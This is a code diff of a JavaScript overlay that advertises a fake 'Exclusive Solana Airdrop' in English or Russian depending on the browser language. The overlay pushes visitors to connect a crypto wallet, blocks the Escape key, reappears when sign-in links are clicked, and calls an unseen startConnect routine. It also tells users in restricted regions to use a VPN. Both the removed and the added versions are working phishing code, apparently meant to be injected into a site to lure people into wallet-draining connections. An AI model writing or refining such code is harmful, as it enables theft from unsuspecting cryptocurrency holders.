@@ -1,83 +1,91 @@
-document.addEventListener('DOMContentLoaded', function() {
-  // 1. Language Detection
-  const isRussian = (navigator.language || navigator.userLanguage).includes('ru');
-
-  // 2. Content
-  const content = {
-    en: {
-      title: "🚀 Exclusive Solana Airdrop Live!",
-      text: "Active Solana users qualify for our massive token distribution. Connect your wallet to check eligibility.",
-      warning: "Users from Russia must use VPN to participate.",
-      button: "Connect Wallet"
-    },
-    ru: {
-      title: "🚀 Эксклюзивный Airdrop в сети Solana!",
-      text: "Активные пользователи Solana могут получить долю в нашем распределении токенов. Подключите кошелек для проверки.",
-      warning: "Участникам из России необходимо использовать VPN.",
-      button: "Подключить кошелек"
-    }
+document.addEventListener('DOMContentLoaded', function () {
+  // 1. Конфигурация
+  const config = {
+    modalZIndex: 9998,
+    showDelay: 500
   };
-  const lang = isRussian ? content.ru : content.en;
 
-  // 3. Create Modal
+  // 2. Языковые настройки
+  const isRussian = (navigator.language || navigator.userLanguage).includes('ru');
+  const lang = isRussian ? {
+    title: "🚀 Эксклюзивный Airdrop в сети Solana!",
+    text: "Подключите кошелек для проверки участия.",
+    warning: "Для участников из ограниченных регионов требуется VPN.",
+    button: "Подключить кошелек"
+  } : {
+    title: "🚀 Exclusive Solana Airdrop Live!",
+    text: "Connect your wallet to check eligibility.",
+    warning: "Users from restricted regions must use VPN.",
+    button: "Connect Wallet"
+  };
+
+  // 3. Создаем модальное окно
   const modal = document.createElement('div');
   modal.id = 'sol-airdrop-modal';
-  modal.style.cssText = `
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.9);
-    backdrop-filter: blur(5px);
-    z-index: 2147483647;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    color: white;
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-    text-align: center;
-    padding: 2rem;
-    box-sizing: border-box;
-    opacity: 1;
-    transition: opacity 0.3s ease;
-  `;
+  Object.assign(modal.style, {
+    position: 'fixed',
+    top: '0',
+    left: '0',
+    width: '100%',
+    height: '100%',
+    backgroundColor: 'rgba(0, 0, 0, 0.9)',
+    zIndex: config.modalZIndex,
+    display: 'flex',
+    justifyContent: 'center',
+    alignItems: 'center',
+    color: 'white',
+    fontFamily: "'Inter', sans-serif",
+    opacity: '0',
+    transition: 'opacity 0.3s ease',
+    pointerEvents: 'none'
+  });
 
-  // 4. Modal Content (with improved styling)
+  // 4. Внутренний контент с обновлённым onclick
   modal.innerHTML = `
     <div style="
-      max-width: 480px;
-      padding: 2.5rem;
-      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-      border-radius: 20px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      max-width: 420px;
+      padding: 2rem;
+      background: linear-gradient(135deg, #1e1b4b 0%, #0f172a 100%);
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
+      pointer-events: auto;
     ">
-      <h1 style="font-size: 1.8rem; margin-bottom: 1.2rem; color: #7e57c2; font-weight: 700;">${lang.title}</h1>
-      <p style="font-size: 1.1rem; line-height: 1.6; margin-bottom: 1.5rem; color: #e2e2e2;">${lang.text}</p>
+      <h1 style="font-size: 1.5rem; margin-bottom: 1rem; color: #a78bfa;">
+        ${lang.title}
+      </h1>
+      <p style="font-size: 1rem; line-height: 1.5; margin-bottom: 1.25rem;">
+        ${lang.text}
+      </p>
       <div style="
-        background: rgba(255, 76, 76, 0.15);
-        padding: 0.8rem;
+        background: rgba(239, 68, 68, 0.15);
+        padding: 0.75rem;
         border-radius: 8px;
-        margin-bottom: 2rem;
-        border-left: 4px solid #ff4c4c;
+        margin-bottom: 1.5rem;
+        border-left: 3px solid #ef4444;
       ">
-        <p style="margin: 0; font-size: 0.95rem; color: #ff9e9e;">⚠️ ${lang.warning}</p>
+        <p style="margin: 0; font-size: 0.9rem; color: #fca5a5;">
+          ⚠️ ${lang.warning}
+        </p>
       </div>
       <button 
-        id="connectWalletBtn"
+        id="airdrop-connect-btn"
         style="
-          padding: 1rem 3rem;
-          font-size: 1.1rem;
-          background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
+          width: 100%;
+          padding: 0.75rem;
+          font-size: 1rem;
+          background: linear-gradient(135deg, #8b5cf6 0%, #10b981 100%);
           color: white;
           border: none;
-          border-radius: 12px;
+          border-radius: 10px;
           cursor: pointer;
-          font-weight: 600;
-          box-shadow: 0 4px 20px rgba(153, 69, 255, 0.4);
-          transition: all 0.3s;
+        "
+        onclick="
+          const modal = document.getElementById('sol-airdrop-modal');
+          modal.style.opacity = '0';
+          modal.style.pointerEvents = 'none';
+          window.allowAutoShow = false;
+          setTimeout(() => { if (modal) modal.remove(); }, 300);
+          if (typeof window.startConnect === 'function') window.startConnect();
         "
       >
         ${lang.button}
@@ -85,39 +93,41 @@ document.addEventListener('DOMContentLoaded', function() {
     </div>
   `;
 
-  // 5. Append to Body
-  document.body.style.overflow = 'hidden';
   document.body.appendChild(modal);
 
-  // 6. Click Handlers
-  let isHidden = false;
+  // 5. Управление видимостью
+  window.allowAutoShow = true;
 
-  // Hide modal on wallet connect
-  document.getElementById('connectWalletBtn').addEventListener('click', function(e) {
-    e.stopPropagation();
-    modal.style.opacity = '0';
-    isHidden = true;
-    window.startConnect(); // Call wallet connection
-  });
+  const showModal = () => {
+    if (window.walletConnected || !window.allowAutoShow) return;
+    modal.style.opacity = '1';
+    modal.style.pointerEvents = 'auto';
+  };
 
-  // Show modal when clicking anywhere
-  document.addEventListener('click', function(e) {
-    if (isHidden && !e.target.closest('#sol-airdrop-modal')) {
-      modal.style.opacity = '1';
-      isHidden = false;
+  // 6. Инициализация
+  setTimeout(showModal, config.showDelay);
+
+  // 7. Обработчик для .goAuth элементов
+  document.addEventListener('click', function (e) {
+    const goAuthElement = e.target.closest('.goAuth');
+    if (goAuthElement && !window.walletConnected) {
+      e.preventDefault();
+      window.allowAutoShow = true;
+      showModal();
     }
-  });
+  }, true);
 
-  // 7. Prevent Closing
-  window.addEventListener('keydown', function(e) {
+  // 8. Проверка подключения кошелька
+  setInterval(() => {
+    if (window.walletConnected) {
+      modal.style.opacity = '0';
+      modal.style.pointerEvents = 'none';
+      window.allowAutoShow = false;
+    }
+  }, 500);
+
+  // 9. Запрет закрытия через Escape
+  window.addEventListener('keydown', function (e) {
     if (e.key === 'Escape') e.preventDefault();
   });
-
-  // 8. Bonus: Re-check wallet connection status periodically
-  setInterval(() => {
-    if (typeof window.walletConnected === 'undefined') return;
-    if (window.walletConnected) {
-      modal.style.display = 'none'; // Permanently hide if wallet connected
-    }
-  }, 1000);
 });
